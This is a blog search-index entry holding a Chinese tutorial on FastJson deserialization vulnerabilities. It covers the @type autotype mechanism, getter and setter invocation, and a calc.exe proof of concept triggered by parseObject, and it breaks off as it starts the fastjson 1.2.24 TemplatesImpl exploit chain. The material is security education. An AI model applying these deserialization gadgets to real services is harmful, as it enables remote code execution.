<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>JAVA-从零到1学习FastJson反序列化</title>
      <link href="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="FastJson简单介绍"><a href="#FastJson简单介绍" class="headerlink" title="FastJson简单介绍"></a>FastJson简单介绍</h1><p>之前基础不好，所以重新写了此文<br>fastjson组件是阿里巴巴开发的反序列化与序列化的组件，依赖</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">1.2</span><span class="number">.23</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>组件使用方法 ：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//序列化</span></span><br><span class="line"><span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> JSON.toJSONString(obj); </span><br><span class="line"><span class="comment">//反序列化</span></span><br><span class="line"><span class="type">VO</span> <span class="variable">vo</span> <span class="operator">=</span> JSON.parse(); <span class="comment">//解析为JSONObject类型或者JSONArray类型</span></span><br><span class="line"><span class="type">VO</span> <span class="variable">vo</span> <span class="operator">=</span> JSON.parseObject(<span class="string">&quot;&#123;...&#125;&quot;</span>); <span class="comment">//JSON文本解析成JSONObject类型</span></span><br><span class="line"><span class="type">VO</span> <span class="variable">vo</span> <span class="operator">=</span> JSON.parseObject(<span class="string">&quot;&#123;...&#125;&quot;</span>, VO.class); <span class="comment">//JSON文本解析成VO.class类</span></span><br></pre></td></tr></table></figure><p>我们写个demo 来测试下使用</p><p>Student.class   定义一个学生类，其包含POJO 也就是 getter  setter 方法，还有其构造函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> String name;  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;构造函数&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> name;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.name = name;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> age;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;setAge&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.age = age;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();  </span><br><span class="line">        student.setName(<span class="string">&quot;Ku1s&quot;</span>);  </span><br><span class="line">        student.setAge(<span class="number">18</span>);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonstring</span> <span class="operator">=</span> JSON.toJSONString(student, SerializerFeature.WriteClassName);  </span><br><span class="line">        System.out.println(jsonstring);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的  SerializerFeature.WriteClassName  是 JSON.toJSONString() 的一个属性设置，再序列化后的时候会写入一个 @type ，即被写上序列化的类名，type可以指定反序列化的类， 并调用其 get&#x2F;set&#x2F;构造方法, 这种@type  也叫  autotype</p><p><code>autotype 是 Fastjson 中的一个重要机制，粗略来说就是用于设置能否将 JSON 反序列化成对象。</code></p><p>输出如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置了SerializerFeature.WriteClassName  </span></span><br><span class="line">构造函数  </span><br><span class="line">setName  </span><br><span class="line">setAge  </span><br><span class="line">getAge  </span><br><span class="line">getName  </span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;Student&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">6</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Mi1k7ea&quot;</span>&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 未设置SerializerFeature.WriteClassName  </span></span><br><span class="line">构造函数  </span><br><span class="line">setName  </span><br><span class="line">setAge  </span><br><span class="line">getAge  </span><br><span class="line">getName  </span><br><span class="line">&#123;<span class="string">&quot;age&quot;</span>:<span class="number">6</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Mi1k7ea&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>test2.class  调用JSON.parseObject() 反序列化对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonstring</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;FastJson.Student\&quot;,\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;Ku1s\&quot;&#125;&quot;</span>;  </span><br><span class="line">        <span class="type">Student</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonstring, Student.class, Feature.SupportNonPublicField);  </span><br><span class="line">        System.out.println(obj);  </span><br><span class="line">        System.out.println(obj.getClass().getName());  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">构造函数</span><br><span class="line">setAge</span><br><span class="line">setName</span><br><span class="line">FastJson.Student@4d76f3f8</span><br><span class="line">FastJson.Student</span><br></pre></td></tr></table></figure><h2 id="Feature-SupportNonPublicField"><a href="#Feature-SupportNonPublicField" class="headerlink" title="Feature.SupportNonPublicField"></a>Feature.SupportNonPublicField</h2><p>如果要还原 private 属性的话，还需要在JSON.parseObject&#x2F;JSON.parse中加上Feature.SupportNonPublicField参数。</p><p>这里改下Student类，将私有属性age的setAge()函数注释掉（一般没人会给私有属性加setter方法，如果有 setter方法 也没有必要是private了）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> String name;  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;构造函数&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> name;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.name = name;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> age;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//    public void setAge(int age) &#123;  </span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;setAge&quot;);  </span></span><br><span class="line"><span class="comment">//        this.age = age;  </span></span><br><span class="line"><span class="comment">//    &#125;  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>去掉Feature.SupportNonPublicField，添加输出两个属性getter方法的返回值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonstring</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;FastJson.Student\&quot;,\&quot;age\&quot;:6,\&quot;name\&quot;:\&quot;Ku1s\&quot;&#125;&quot;</span>;  </span><br><span class="line">        <span class="type">Student</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonstring, Student.class);  </span><br><span class="line">        System.out.println(obj);  </span><br><span class="line">        System.out.println(obj.getClass().getName());  </span><br><span class="line">        System.out.println(obj.getName() + <span class="string">&quot; &quot;</span> + obj.getAge());  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">FastJson.Student@4d76f3f8</span><br><span class="line">FastJson.Student</span><br><span class="line">getName</span><br><span class="line">getAge</span><br><span class="line">Ku1s <span class="number">0</span></span><br></pre></td></tr></table></figure><p>看到 age 会变成  0 。</p><p>如果我们再加上  Feature.SupportNonPublicField ，就能输出私有变量的值了，当然，这个英文的名也很容易理解 (支持非 public 值)</p><p>也就是说，若想让传给JSON.parseObject()进行反序列化的JSON内容指向的对象类中的私有变量成功还原出来，则需要在调用JSON.parseObject()时加上Feature.SupportNonPublicField这个属性设置才行~~~</p><h2 id="parse-和-parseObject-的区别"><a href="#parse-和-parseObject-的区别" class="headerlink" title="parse 和 parseObject 的区别"></a>parse 和 parseObject 的区别</h2><p>demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">jsonString1</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;Ku1s\&quot;&#125;\n&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">jsonString2</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;fastjson.Student\&quot;,\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;Ku1s\&quot;&#125;\n&quot;</span>;</span><br><span class="line">System.out.println(JSON.parse(jsonString1));</span><br><span class="line">System.out.println(<span class="string">&quot;======================&quot;</span>);</span><br><span class="line">System.out.println(JSON.parse(jsonString2));</span><br><span class="line">System.out.println(<span class="string">&quot;======================&quot;</span>);</span><br><span class="line">System.out.println(JSON.parseObject(jsonString1));</span><br><span class="line">System.out.println(<span class="string">&quot;======================&quot;</span>);</span><br><span class="line">System.out.println(JSON.parseObject(jsonString2));</span><br><span class="line">System.out.println(<span class="string">&quot;======================&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Ku1s&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">18</span>&#125;</span><br><span class="line">======================</span><br><span class="line">构造函数</span><br><span class="line">setAge</span><br><span class="line">setName</span><br><span class="line">fastjson.Student@4629104a</span><br><span class="line">======================</span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Ku1s&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">18</span>&#125;</span><br><span class="line">======================</span><br><span class="line">构造函数</span><br><span class="line">setAge</span><br><span class="line">setName</span><br><span class="line">getAge</span><br><span class="line">getName</span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Sentiment&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">18</span>&#125;</span><br><span class="line">======================</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到：</p><p>当不加上<code>@type</code>指明类，是得不到类对象的</p><p>当对加上<code>@type</code>字段的字符串进行转换后，除了能得到类对象外，<code>parse</code>会调用对应的<code>setter</code>，<code>parseObject</code>会调用<code>setter</code>和<code>getter</code></p><p>所以 ，我基本上都只用paserObject</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FastJson中的 parse() 和 parseObject()方法都可以用来将JSON字符串反序列化成Java对象，parseObject() 本质上也是调用 parse() 进行反序列化的。但是 parseObject() 会额外的将Java对象转为 JSONObject对象，即 JSON.toJSON()。所以进行反序列化时的细节区别在于，parse() 会识别并调用目标类的 setter 方法及某些特定条件的 getter 方法，而 parseObject() 由于多执行了 JSON.toJSON(obj)，所以在处理过程中会调用反序列化目标类的所有 setter 和 getter 方法。</span><br></pre></td></tr></table></figure><p>也就是说，我们用parse()反序列化会直接得到特定的类，而无需像parseObject()一样返回的是JSONObject类型的对象、还可能需要去设置第二个参数指定返回特定的类。</p><h1 id="Fastjson-反序列化漏洞原理"><a href="#Fastjson-反序列化漏洞原理" class="headerlink" title="Fastjson 反序列化漏洞原理"></a>Fastjson 反序列化漏洞原理</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>前面得知， FastJson 的序列化与反序列化 不同与 java 原生的机制，无论哪个版本，fastjson 的漏洞原理都是一致的，只不过是针对黑白名单的利用来进行绕过。</p><p>攻击者可以传入一个恶意构造的JSON内容，程序对其反序列化后得到恶意类 并执行了恶意类中的恶意函数，从而代码执行。</p><h2 id="那么如何才能够反序列化出恶意类呢？"><a href="#那么如何才能够反序列化出恶意类呢？" class="headerlink" title="那么如何才能够反序列化出恶意类呢？"></a>那么如何才能够反序列化出恶意类呢？</h2><p>由前面demo知道，Fastjson使用parseObject()&#x2F;parse()进行反序列化的时候可以指定类型。如果指定的类型太大，包含太多子类，就有利用空间了。例如，如果指定类型为Object或JSONObject，则可以反序列化出来任意类。例如代码写<code>Object o = JSON.parseObject(poc,Object.class)</code>就可以反序列化出Object类或其任意子类，而Object又是任意类的父类，所以就可以反序列化出所有类。</p><h2 id="如何才能触发反序列化得到的恶意类中的恶意函数？"><a href="#如何才能触发反序列化得到的恶意类中的恶意函数？" class="headerlink" title="如何才能触发反序列化得到的恶意类中的恶意函数？"></a>如何才能触发反序列化得到的恶意类中的恶意函数？</h2><p>前面demo 得知， parseObject 反序列化时，会将类的构造函数、getter方法、setter方法执行一遍，如果这三种方法中存在危险操作，则可能导致反序列化漏洞的存在。换句话说，就是攻击者传入要进行反序列化的类中的构造函数、getter方法、setter方法中要存在漏洞才能触发。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>我们已经知道了 如果该类的 getter setter 构造方法中如果存在 漏洞代码，则可以代码执行，所以我们这里做最简单的示范，将 Student 类中 构造函数 改为 弹计算器：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> String name;  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;构造函数&quot;</span>);  </span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> name;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.name = name;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> age;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//    public void setAge(int age) &#123;  </span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;setAge&quot;);  </span></span><br><span class="line"><span class="comment">//        this.age = age;  </span></span><br><span class="line"><span class="comment">//    &#125;  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonstring</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;FastJson.Student\&quot;,\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;Ku1s\&quot;&#125;&quot;</span>;  </span><br><span class="line">         <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonstring, Object.class, Feature.SupportNonPublicField);</span><br><span class="line">        System.out.println(obj);  </span><br><span class="line">        System.out.println(obj.getClass().getName());   </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.jpg"></p><p>很明显，前面的Demo中反序列化的类是一个Object类，该类是任意类的父类，其子类Student存在Fastjson反序列化漏洞，当@type指向Student类是反序列化就会触发漏洞。</p><p>对于另一种反序列化指定类的情景，是该指定类本身就存在漏洞，比如我们将上述Demo中反序列化那行代码改成直接反序列化得到Student类而非Object类，这样就是另一个触发也是最直接的触发场景：<br><code>Student obj = JSON.parseObject(jsonstring, Student.class, Feature.SupportNonPublicField);</code></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>若反序列化指定类型的类如<code>Student obj = JSON.parseObject(text, Student.class);</code>，该类本身的构造函数、setter方法、getter方法存在危险操作，则存在Fastjson反序列化漏洞；</p><p>若反序列化未指定类型的类如<code>Object obj = JSON.parseObject(text, Object.class);</code>，该若该类的子类的构造方法、setter方法、getter方法存在危险操作，则存在Fastjson反序列化漏洞；</p><p>Fastjson会对满足下列要求的setter&#x2F;getter方法进行调用：</p><p>满足条件的setter：</p><ul><li>函数名长度大于4且以set开头</li><li>非静态函数</li><li>返回类型为void或当前类</li><li>参数个数为1个</li></ul><p>满足条件的getter：</p><ul><li>函数名长度大于等于4</li><li>非静态方法</li><li>以get开头且第4个字母为大写</li><li>无参数</li><li>返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong</li></ul><h1 id="Fastjson-lt-x3D-1-2-24-反序列化漏洞"><a href="#Fastjson-lt-x3D-1-2-24-反序列化漏洞" class="headerlink" title="Fastjson &lt; &#x3D; 1.2.24 反序列化漏洞"></a>Fastjson &lt; &#x3D; 1.2.24 反序列化漏洞</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>fastjson-1.2.24.jar，commons-codec-1.12.jar，commons-io-2.5.jar，另外基于JdbcRowSetImpl调用链的利用还需要unboundid-ldapsdk-4.0.9.jar。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt; </span><br><span class="line">&lt;groupId&gt;com.unboundid&lt;/groupId&gt; </span><br><span class="line">&lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt; </span><br><span class="line">&lt;version&gt;<span class="number">4.0</span><span class="number">.9</span>&lt;/version&gt; </span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;commons-io&lt;/groupId&gt; </span><br><span class="line">&lt;artifactId&gt;commons-io&lt;/artifactId&gt; </span><br><span class="line">&lt;version&gt;<span class="number">2.5</span>&lt;/version&gt; </span><br><span class="line">&lt;/dependency&gt; </span><br><span class="line"></span><br><span class="line">&lt;dependency&gt; </span><br><span class="line">&lt;groupId&gt;com.alibaba&lt;/groupId&gt; </span><br><span class="line">&lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;<span class="number">1.2</span><span class="number">.24</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt; </span><br><span class="line"></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;commons-codec&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;commons-codec&lt;/artifactId&gt; </span><br><span class="line">&lt;version&gt;<span class="number">1.12</span>&lt;/version&gt; </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h2 id="基于TemplateImpl的利用链"><a href="#基于TemplateImpl的利用链" class="headerlink" title="基于TemplateImpl的利用链"></a>基于TemplateImpl的利用链</h2><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><p>之前我们在CC3学过 这条链子，就是把几个属性值赋值了，然后再加载我们的 恶意byteCode，因为 TemplatesImpl 类中的 name &#x2F; bytecodes  都时 private 属性 ，所以我们得使用我们上面学过的 Feature.SupportNonPublicField进行反序列化操作才能成功触发利用</p><h3 id="复现利用"><a href="#复现利用" class="headerlink" title="复现利用"></a>复现利用</h3><p>恶意类 Test.java  用于弹计算器，至于为什么继承 AbstractTranslet类在后面的调试分析中会具体看到：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;  </span><br><span class="line"><span class="keyword">import</span> 